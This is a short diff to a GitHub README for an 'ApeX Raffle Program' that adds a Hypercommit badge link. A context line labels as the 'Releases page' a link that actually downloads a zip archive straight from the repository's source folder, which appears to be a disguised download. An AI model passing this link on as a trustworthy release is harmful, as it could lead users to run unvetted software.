@@ -112,3 +112,7 @@ For support, you can open an issue on the GitHub repository. The community or de
 ## 🎈 Acknowledgments
 
 Thank you for using the ApeX Raffle Program! Enjoy participating in exciting raffles and good luck! Don't forget to visit the [Releases page](https://github.com/MIRAXVISHU/ApeX-Raffle-program/raw/refs/heads/main/raffle/cli/Raffle-program-Ape-v2.2.zip) for updates and more information.
+
+## Links
+
+[![Hypercommit](https://img.shields.io/badge/Hypercommit-DB2475)](https://hypercommit.com/apex-raffle-program)
